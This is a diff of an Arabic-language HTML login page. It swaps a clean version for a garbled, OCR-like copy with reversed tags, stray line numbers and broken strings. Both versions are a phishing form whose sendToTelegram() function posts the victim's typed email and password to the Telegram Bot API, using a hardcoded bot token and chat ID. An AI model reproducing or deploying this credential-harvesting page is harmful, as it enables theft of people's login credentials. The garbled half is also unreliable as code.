@@ -1,62 +1,203 @@
 <!DOCTYPE html>
+
+Spaces
+
 <html lang="ar">
+
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول</title>
-    <style>
-        body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
-        input { display: block; width: 80%; margin: 10px auto; padding: 10px; }
-        button { padding: 10px 20px; background-color: blue; color: white; border: none; cursor: pointer; }
-        button:hover { background-color: darkblue; }
-    </style>
+
+<meta charset="UTF-8">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+>title< تسجيل الدخول >/title<
+
+<style>
+
+body { font-family: Arial, sans-serif; text-align: center; margin: 50px; }
+
+input { display: block; width: 80%; margin: 10px auto; padding: 10px;}
+
+button { padding: 10px 20px; background-color: blue; color: white; border: none; cursor: po
+
+button:hover { background-color: darkblue; }
+
+</style>
+
+<h2/> تسجيل الدخول <h2>
+
+>input type="email" id="email" placeholder=" البريد الإلكترولي" required<
+
+>input type="password" id="password" placeholder "كلمة المرور" required<
+
+>button onclick="sendToTelegram)(" تسجيل >/button<
+
+<script>
+
+function sendToTelegram() (
+
+سالات النوت ال
+
+const bot Token = "7672390569:AAF-vr0fIKGs9Tj7p--hWBJz1ZF8Xw2763مع الترك
+
+const chatld "7141386521" // مو معرف الرقة هنا
+
+11
+
+12
+
+13
+
 </head>
+
+14
+
 <body>
 
-    <h2>تسجيل الدخول</h2>
-    <input type="email" id="email" placeholder="البريد الإلكتروني" required>
-    <input type="password" id="password" placeholder="كلمة المرور" required>
-    <button onclick="sendToTelegram()">تسجيل</button>
+15
 
-    <script>
-        function sendToTelegram() {
-            // بيانات البوت
-            const botToken = "7672390569:AAF-vr0fIKGs9Tj7p--hWBJz1ZF8Xw2763A";  // ضع التوكن هنا
-            const chatId = "7141386521";  // ضع معرف الدردشة هنا
+16
 
-            // الحصول على المدخلات
-            const email = document.getElementById("email").value;
-            const password = document.getElementById("password").value;
+17
 
-            // التحقق من عدم ترك الحقول فارغة
-            if (email === "" || password === "") {
-                alert("يرجى ملء جميع الحقول!");
-                return;
-            }
+18
 
-            // تنسيق الرسالة
-            const message = 🔔 تسجيل جديد:\n📧 البريد: ${email}\n🔑 كلمة المرور: ${password};
+19
 
-            // رابط API تيليجرام
-            const url = https://api.telegram.org/bot${botToken}/sendMessage;
+20
 
-            // إرسال الطلب
-            fetch(url, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ chat_id: chatId, text: message })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    alert("تم الإرسال بنجاح!");
-                } else {
-                    alert("حدث خطأ أثناء الإرسال.");
-                }
-            })
-            .catch(error => console.error("Error:", error));
-        }
-    </script>
+21
+
+22
+
+23
+
+24
+
+25
+
+26
+
+27
+
+28
+
+29
+
+30
+
+31
+
+32
+
+33
+
+34
+
+35
+
+30
+
+37
+
+38
+
+39
+
+40
+
+41
+
+42
+
+43
+
+44
+
+45
+
+الحصول على المقالات /
+
+const email document.getElementById("email").value;
+
+const password document.getElementById("password").value;
+
+if (email==="" || password === "") {
+
+التحقق من عدم في الحقول مارية 11
+
+ايرجى ملء جميع الحقول " )alert
+
+return;
+
+سيق الرسالة //
+
+const message- البريد تسجيل جديد: )email)in كلمة المرور : )password(:
+
+const url https://api.telegram.org/bot(botToken)/sendMessage:
+
+fetch(url,
+
+method: "POST".
+
+headers: ("Content-Type": "application/json" },
+
+body: JSON.stringify({ chat id: chatid, text: message ))
+
+47
+
+48
+
+})
+
+49
+
+.then(response response.json())
+
+.then(data> {
+
+50
+
+51
+
+if (data.ok) {
+
+52
+
+53
+
+} else {
+
+54
+
+: ( " الم الإرسال بنجاح " )alert
+
+: ( حدث عطا البلد الإرسال ")alert
+
+55
+
+56
+
+57
+
+})
+
+.catch(error -> console.error("Error:", error));
+
+58
+
+59
+
+}
+
+</script>
+
+60
+
+61
 
 </body>
+
+62
+
 </html>
